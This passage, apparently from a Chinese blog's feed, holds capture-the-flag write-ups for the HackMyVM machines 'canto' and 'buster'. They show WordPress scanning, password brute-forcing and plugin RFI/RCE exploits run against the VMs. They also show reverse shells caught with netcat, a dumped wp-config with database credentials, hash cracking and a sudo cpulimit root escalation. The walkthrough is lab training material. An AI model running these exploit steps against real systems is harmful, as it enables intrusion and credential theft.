 |  - http://192.168.205.213/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;

[+] WordPress theme in use: twentytwentyfour
 | Location: http://192.168.205.213/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://192.168.205.213/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | [!] Directory listing is enabled
 | Style URL: http://192.168.205.213/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.205.213/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 &lt;=========================================================&gt; (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] erik
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.205.213/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 23

[+] Finished: Sun Dec 29 19:08:28 2024
[+] Requests Done: 57
[+] Cached Requests: 6
[+] Data Sent: 14.504 KB
[+] Data Received: 236.451 KB
[+] Memory used: 268.914 MB
[+] Elapsed time: 00:00:06
                                                    
```

然后我拿erik爆破了WordPress还爆破了ssh，都没有结果，回去看了眼网页发现他是WordPress，为什么起名Canto还写的有模样有的，我还以为是CMS呢，搜索了一下这个名字的漏洞

```bash
┌──(kali㉿kali)-[~/test]
└─$ searchsploit Canto                  
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
NetScanTools Basic Edition 2.5 - 'Hostname' Denial of Service (PoC)                                  | windows/dos/45095.py
Wordpress Plugin Canto 1.3.0 - Blind SSRF (Unauthenticated)                                          | multiple/webapps/49189.txt
Wordpress Plugin Canto &lt; 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)         | php/webapps/51826.py
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                           
```

然后我发现这不会是个插件吧，用了一下php/webapps/51826.py，发现还真是

```bash
┌──(kali㉿kali)-[~/test]
└─$ searchsploit -m php/webapps/51826.py
  Exploit: Wordpress Plugin Canto &lt; 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/51826
     Path: /usr/share/exploitdb/exploits/php/webapps/51826.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable, with very long lines (344)
Copied to: /home/kali/test/51826.py

┌──(kali㉿kali)-[~/test]
└─$ python3 51826.py          
usage: 51826.py [-h] -u URL [-s SHELL] -LHOST LOCAL_HOST [-LPORT LOCAL_PORT] [-c COMMAND] [-NC_PORT NC_PORT]
51826.py: error: the following arguments are required: -u/--url, -LHOST/--local_host
usage: 51826.py [-h] -u URL [-s SHELL] -LHOST LOCAL_HOST [-LPORT LOCAL_PORT] [-c COMMAND] [-NC_PORT NC_PORT]

Script to exploit the Remote File Inclusion vulnerability in the Canto plugin for WordPress - CVE-2023-3452

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     Vulnerable URL
  -s SHELL, --shell SHELL
                        Local file for web shell
  -LHOST LOCAL_HOST, --local_host LOCAL_HOST
                        Local web server IP
  -LPORT LOCAL_PORT, --local_port LOCAL_PORT
                        Local web server port
  -c COMMAND, --command COMMAND
                        Command to execute on the target
  -NC_PORT NC_PORT, --nc_port NC_PORT
                        Listener port for netcat

    Examples:
    - Check the vulnerability
    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33

    - Execute a command
    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -c 'id'

    - Upload and run a reverse shell file. You can download it from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php or generate it with msfvenom.
    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -s php-reverse-shell.php
  
                                                                                              
┌──(kali㉿kali)-[~/test]
└─$ python3 51826.py -u http://192.168.205.213 -LHOST 192.168.205.141           
Exploitation URL: http://192.168.205.213/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.205.141:8080&amp;cmd=whoami
Local web server on port 8080...
192.168.205.213 - - [29/Dec/2024 19:37:27] 'GET /wp-admin/admin.php HTTP/1.1' 200 -
Server response:
www-data
```

后面就按照提示使用脚本就好了

```bash
┌──(kali㉿kali)-[~/test]
└─$ python3 51826.py -u http://192.168.205.213 -LHOST 192.168.205.141 -s index.php
Exploitation URL: http://192.168.205.213/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.205.141:8080&amp;cmd=whoami
invalid local port None
Local web server on port 8080...
192.168.205.213 - - [29/Dec/2024 19:25:16] 'GET /wp-admin/admin.php HTTP/1.1' 200 -

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8888                           
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.213] 57360
Linux canto 6.5.0-28-generic #29-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 28 23:46:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 11:24:29 up 20 min,  0 user,  load average: 0.25, 2.51, 3.83
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

成功弹了回来

### 3.**获得稳定 shell**

获得交互式 TTY shell：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

### 4.**提权**

```bash
www-data@canto:/home$ ls -al
total 12
drwxr-xr-x  3 root root     4096 May 12  2024 .
drwxr-xr-x 20 root root     4096 May 12  2024 ..
drwxr-xr--  5 erik www-data 4096 May 12  2024 erik

```

发现我有erik的访问权限，进去溜达了一下

```bash
www-data@canto:/home/erik$ ls -al
total 36
drwxr-xr-- 5 erik www-data 4096 May 12  2024 .
drwxr-xr-x 3 root root     4096 May 12  2024 ..
lrwxrwxrwx 1 root root        9 May 12  2024 .bash_history -&gt; /dev/null
-rw-r--r-- 1 erik erik      220 Jan  7  2023 .bash_logout
-rw-r--r-- 1 erik erik     3771 Jan  7  2023 .bashrc
drwx------ 2 erik erik     4096 May 12  2024 .cache
drwxrwxr-x 3 erik erik     4096 May 12  2024 .local
-rw-r--r-- 1 erik erik      807 Jan  7  2023 .profile
drwxrwxr-x 2 erik erik     4096 May 12  2024 notes
-rw-r----- 1 root erik       33 May 12  2024 user.txt
www-data@canto:/home/erik$ cd notes/
www-data@canto:/home/erik/notes$ ls -al
total 16
drwxrwxr-x 2 erik erik     4096 May 12  2024 .
drwxr-xr-- 5 erik www-data 4096 May 12  2024 ..
-rw-rw-r-- 1 erik erik       68 May 12  2024 Day1.txt
-rw-rw-r-- 1 erik erik       71 May 12  2024 Day2.txt
www-data@canto:/home/erik/notes$ cat Day
cat: Day: No such file or directory
www-data@canto:/home/erik/notes$ cat Day1.txt 
On the first day I have updated some plugins and the website theme.
www-data@canto:/home/erik/notes$ cat Day2.txt 
I almost lost the database with my user so I created a backups folder.


翻译：

Day1.txt

第一天我更新了一些插件和网站主题。

Day2.txt

我差点丢失了用户的数据库，所以我创建了一个备份文件夹。
```

备份文件夹我很感兴趣，通常关于网站的应该都在`/var/www/`里

```bash
www-data@canto:/var/www$ ls -al
total 16
drwxr-xr-x  3 www-data www-data 4096 May 12  2024 .
drwxr-xr-x 15 root     root     4096 May 12  2024 ..
-rw-------  1 www-data www-data  219 May 12  2024 .bash_history
drwxr-xr-x  5 www-data www-data 4096 Dec 29 11:05 html
www-data@canto:/var/www$ cat .bash_history
cd /var/wordpress
cd /var
cd /wordpress
export TERM=xterm
clear
ls
cd wordpress
cd wordpres
ls
cd backups
ls
clear
ls
ls -la
unzip dbbackup.zip
ls
clear
ls -la
su erik
cd /var/wordpress/backups
ls
cat 12052024.txt
exit

```

有个`.bash_history`，答案显而易见了`/var/wordpress/backups/12052024.txt`，成功登录erik用户,`sudo -l`一下

```bash
erik@canto:~$ sudo -l
Matching Defaults entries for erik on canto:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User erik may run the following commands on canto:
    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit

```

[cpulimit sudo 提权方法](https://gtfobins.github.io/gtfobins/cpulimit/#sudo)

```bash
erik@canto:~$ sudo cpulimit -l 100 -f /bin/sh
Process 2669 detected
# id
uid=0(root) gid=0(root) groups=0(root)
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_canto.html</guid><pubDate>Fri, 27 Jun 2025 09:32:44 +0000</pubDate></item><item><title>hmv_buster</title><link>https://7r1UMPHK.github.io/post/hmv_buster.html</link><description># hmv_buster

# 0.简介

**靶机**：[hackmyvm - buster](https://hackmyvm.eu/machines/machine.php?vm=buster)
**难度**：绿色
**目标 IP**：192.168.205.142
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.142
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 20:11 CST
Nmap scan report for 192.168.205.142
Host is up (0.00022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:09:D8:74 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds

```

先看**80端口**，**22端口**候补

# 2.踩点

![image](https://github.com/user-attachments/assets/9eb492e1-d1d8-4170-bb5f-990d1792265b)
是个**wordPress，**  拿**wpscan**扫描一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ wpscan --url http://192.168.205.142/ -e vp,u --api-token xxx   #api-token注册wpscan官网获取
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.205.142/ [192.168.205.142]
[+] Started: Wed Jan 15 20:13:50 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.14.2
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://192.168.205.142/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.205.142/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.205.142/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.205.142/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).
 | Found By: Meta Generator (Passive Detection)
 |  - http://192.168.205.142/, Match: 'WordPress 6.7.1'
 | Confirmed By: Rss Generator (Aggressive Detection)
 |  - http://192.168.205.142/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;
 |  - http://192.168.205.142/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;

[i] The main theme could not be detected.

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 &lt;========================================================&gt; (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] ta0
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://192.168.205.142/wp-json/wp/v2/users/?per_page=100&amp;page=1
 | Confirmed By:
 |  Rss Generator (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] welcome
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 1
 | Requests Remaining: 18

[+] Finished: Wed Jan 15 20:13:57 2025
[+] Requests Done: 53
[+] Cached Requests: 6
[+] Data Sent: 13.267 KB
[+] Data Received: 413.04 KB
[+] Memory used: 229.277 MB
[+] Elapsed time: 00:00:07
                                                     
```

主要的信息有`WordPress 6.7.1`和两个用户名`ta0`、`welcome`，但是`WordPress 6.7.1`没有漏洞，只可以爆破密码了

```bash
┌──(kali㉿kali)-[~/test]
└─$ wpscan -U ta0,welcome -P /usr/share/wordlists/q5000.txt --url http://192.168.205.142/             
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

（省略）

[+] Performing password attack on Xmlrpc against 2 user/s
Trying ta0 / speaker Time: 00:01:37 &lt;=========================================================&gt; (10000 / 10000) 100.00% Time: 00:01:37

[i] No Valid Passwords Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Jan 15 20:18:29 2025
[+] Requests Done: 10142
[+] Cached Requests: 34
[+] Data Sent: 5.147 MB
[+] Data Received: 5.559 MB
[+] Memory used: 278.031 MB
[+] Elapsed time: 00:01:40

```

爆破了前5000行`rockyou.txt`都没有结果，没有必要爆破了，根据现在获得的信息无法判断出攻击面，但是`WordPress`靶机还有一个攻击点——**插件**

```bash
┌──(kali㉿kali)-[~/test]
└─$ wpscan --url http://192.168.205.142/ -e ap --plugins-detection aggressive --api-token xxx   #api-token注册wpscan官网获取
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
（省略）

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:17:12 &lt;================================================&gt; (108550 / 108550) 100.00% Time: 00:17:12
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.205.142/wp-content/plugins/akismet/
 | Latest Version: 5.3.5 (up to date)
 | Last Updated: 2024-11-19T02:02:00.000Z
 | Readme: http://192.168.205.142/wp-content/plugins/akismet/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/akismet/, status: 200
 |
 | Version: 5.3.5 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/akismet/readme.txt

[+] feed
 | Location: http://192.168.205.142/wp-content/plugins/feed/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/feed/, status: 200
 |
 | The version could not be determined.

[+] wp-query-console
 | Location: http://192.168.205.142/wp-content/plugins/wp-query-console/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2018-03-16T16:03:00.000Z
 | Readme: http://192.168.205.142/wp-content/plugins/wp-query-console/README.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/wp-query-console/, status: 403
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: WP Query Console &lt;= 1.0 - Unauthenticated Remote Code Execution
 |     References:
 |      - https://wpscan.com/vulnerability/f911568d-5f79-49b7-8ce4-fa0da3183214
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-50498
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ae07ca12-e827-43f9-8cbb-275b9abbd4c3
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/wp-query-console/README.txt

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 15

[+] Finished: Wed Jan 15 20:39:16 2025
[+] Requests Done: 108575
[+] Cached Requests: 44
[+] Data Sent: 29.36 MB
[+] Data Received: 32.766 MB
[+] Memory used: 479.719 MB
[+] Elapsed time: 00:17:25

```

`wp-query-console`有漏洞，我们去搜索一下有没有利用方案。可以找到一篇这样的文章[RandomRobbieBF/CVE-2024-50498](https://github.com/RandomRobbieBF/CVE-2024-50498)

![image](https://github.com/user-attachments/assets/72a55300-d8e3-4b5d-b895-5a370c1fd640)

根据提示利用一下

![image](https://github.com/user-attachments/assets/3a1b94f1-b121-441a-a33c-d6db585b5507)

成功利用，尝试看能不能弹shell

![image](https://github.com/user-attachments/assets/74d4c4b9-7dc8-4f1b-9bd6-669273dfc52f)

显示查询参数失败，我们尝试ping kali，无果，应该是ban了函数，我们搜索一下

![image](https://github.com/user-attachments/assets/d355dc93-3a9f-436e-a874-7b36e93f57b5)

确实被ban了，我们尝试一下使用未被ban的函数

![image](https://github.com/user-attachments/assets/82858cb3-8662-44af-b9aa-f5f02210d1ad)

```bash
┌──(kali㉿kali)-[~/test]
└─$ sudo tcpdump -A -n icmp  
[sudo] kali 的密码：
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
20:52:15.340738 IP 192.168.205.142 &gt; 192.168.205.141: ICMP echo request, id 1113, seq 1, length 64
E..T..@.@.)..............Y..e..g....j....................... !'#$%&amp;'()*+,-./01234567
20:52:15.340759 IP 192.168.205.141 &gt; 192.168.205.142: ICMP echo reply, id 1113, seq 1, length 64
E..T
O..@.S..............Y..e..g....j....................... !'#$%&amp;'()*+,-./01234567
20:52:16.353977 IP 192.168.205.142 &gt; 192.168.205.141: ICMP echo request, id 1113, seq 2, length 64
E..T.M@.@.(...........4Y.Y..f..g.....b...................... !'#$%&amp;'()*+,-./01234567
20:52:16.353997 IP 192.168.205.141 &gt; 192.168.205.142: ICMP echo reply, id 1113, seq 2, length 64
E..T
T..@.S...........&lt;Y.Y..f..g.....b...................... !'#$%&amp;'()*+,-./01234567

```

我们可以看到我们的ping命令被执行了，我们进行弹shell

![image](https://github.com/user-attachments/assets/8effbcee-22c7-4b8d-9c2d-e1f2d8b65842)

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888                                  
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.142] 58804
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```bash
www-data@listen:~/html/wordpress$ cd /home/
www-data@listen:/home$ ls -la
total 12
drwxr-xr-x  3 root    root    4096 Jan  7 23:16 .
drwxr-xr-x 18 root    root    4096 Jan  7 21:50 ..
drwx------  2 welcome welcome 4096 Jan  7 23:18 welcome
```

当看到这个**id**的时候我就知道要去查看**mysql**了，因为这个名字和爆破出来的名字一样，我们先去找一下**mysql**的密码

```bash
www-data@listen:/home$ cd /var/www/html/wordpress/
www-data@listen:~/html/wordpress$ ls -la
total 248
drwxr-xr-x  5 www-data www-data  4096 Jan  8 02:25 .
drwxr-xr-x  3 root     root      4096 Jan  7 23:52 ..
-rwxr-xr-x  1 www-data www-data   405 Jan  8 02:25 index.php
-rwxr-xr-x  1 www-data www-data 19915 Dec 31  2023 license.txt
-rwxr-xr-x  1 www-data www-data  7409 Jun 18  2024 readme.html
-rw-r--r--  1 root     root       684 Jan  8 02:25 update_url.php
-rwxr-xr-x  1 www-data www-data  7387 Feb 13  2024 wp-activate.php
drwxr-xr-x  9 www-data www-data  4096 Nov 21 09:07 wp-admin
-rwxr-xr-x  1 www-data www-data   351 Feb  6  2020 wp-blog-header.php
-rwxr-xr-x  1 www-data www-data  2323 Jun 14  2023 wp-comments-post.php
-rwxr-xr-x  1 www-data www-data  3336 Oct 15 11:24 wp-config-sample.php
-rw-rw-rw-  1 www-data www-data  3620 Jan  8 02:25 wp-config.php
drwxr-xr-x  6 www-data www-data  4096 Jan  8 02:20 wp-content
-rwxr-xr-x  1 www-data www-data  5617 Aug  2 15:40 wp-cron.php
drwxr-xr-x 30 www-data www-data 12288 Nov 21 09:07 wp-includes
-rwxr-xr-x  1 www-data www-data  2502 Nov 26  2022 wp-links-opml.php
-rwxr-xr-x  1 www-data www-data  3937 Mar 11  2024 wp-load.php
-rwxr-xr-x  1 www-data www-data 51367 Sep 30 15:12 wp-login.php
-rwxr-xr-x  1 www-data www-data  8543 Sep 18 18:37 wp-mail.php
-rwxr-xr-x  1 www-data www-data 29032 Sep 30 13:08 wp-settings.php
-rwxr-xr-x  1 www-data www-data 34385 Jun 19  2023 wp-signup.php
-rwxr-xr-x  1 www-data www-data  5102 Oct 18 11:56 wp-trackback.php
-rwxr-xr-x  1 www-data www-data  3246 Mar  2  2024 xmlrpc.php
www-data@listen:~/html/wordpress$ cat wp-config.php
&lt;?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to 'wp-config.php'
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'll104567' );

/** Database password */
define( 'DB_PASSWORD', 'thehandsomeguy' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '2Ryf &lt;:T/-4,9h?q%jDi(HKG_*1xH-nU+-//7[1H}zD@=q0ls8junY(~.MG@D[$S' );
define( 'SECURE_AUTH_KEY',  '}z]MVJ|P5~X1!+76?dT?s|@A,92D4/+phWkWb=;I+k{_y)7,A,&lt;=5|&amp;z&lt;tE:`HET' );
define( 'LOGGED_IN_KEY',    'p4w9&gt;FcR&gt;{+u:M,M4rT}VIW.[Pg=UZjzp8n{-/&amp;F;j!nC49f-^~$unsry+lHW w!' );
define( 'NONCE_KEY',        ';qi?~eGux58*l4NoDh@?&lt;`^B6!HK{G:C85Hv8sC6&lt;t,y}8veV4pvs#{ [[T?s123' );
define( 'AUTH_SALT',        'l2^yBli3l_G#J&lt;T 2p}e#bS&gt;j_=,!06$%qYd#I&lt;p22c:z&amp;`s?ic;7UxS$T6c{HXr' );
define( 'SECURE_AUTH_SALT', '&lt;;95CFam*#)^qbL)a,KZXrqS$!]Ln^2yF2wg#Fa?9F&lt;D)-,irw&amp;nj/$pB)BR1u|O' );
define( 'LOGGED_IN_SALT',   'JaR6i0q&lt;wZMJD-7HwE:7ZwtNxV$BJ%15=8~Bw(_jCL_`+&lt;`^asIdv=$Yo81jE19K' );
define( 'NONCE_SALT',       'q!5K2-Q*^%Tf&lt;lz)*o0&amp;8/CCjU;8-jdLS4,*5vk/8,^j&amp;]&lt;S7+I&amp;eO55C_CM6N@L' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 *
 * At the installation time, database tables are created with the specified prefix.
 * Changing this value after WordPress is installed will make your site think
 * it has not been installed.
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/#table-prefix
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://developer.wordpress.org/advanced-administration/debug/debug-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the 'stop editing' line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
if ( file_exists(ABSPATH . 'update-url.php') ) {
    include_once(ABSPATH . 'update-url.php');
}

```

登录

```bash
www-data@listen:~/html/wordpress$ mysql -u ll104567 -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 118794
Server version: 10.3.39-MariaDB-0+deb10u2 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wordpress          |
+--------------------+
2 rows in set (0.000 sec)

MariaDB [(none)]&gt; use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [wordpress]&gt; show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.000 sec)

MariaDB [wordpress]&gt; select * from wp_users;
+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email        | user_url              | user_registered     | user_activation_key                           | user_status | display_name |
+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+
|  1 | ta0        | $P$BDDc71nM67DbOVN/U50WFGII6EF6.r. | ta0           | 2814928906@qq.com | http://192.168.31.181 | 2025-01-08 03:10:43 |                                               |           0 | ta0          |
|  2 | welcome    | $P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/ | welcome       | 127.0.0.1@qq.com  |                       | 2025-01-08 04:29:28 | 1736310568:$P$B2YbhlDVF1XWIurbL11Pfoasb./0tD. |           0 | welcome      |
+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+
2 rows in set (0.000 sec)


```

可以获得密码哈希是`BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/`，我们爆破一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
```

获得密码，我们切换一下用户

```bash
www-data@listen:~/html/wordpress$ su - welcome
Password: 
$ id
uid=1001(welcome) gid=1001(welcome) groups=1001(welcome)
```

继续尝试提权

```bash
$ sudo -l
Matching Defaults entries for welcome on listen:
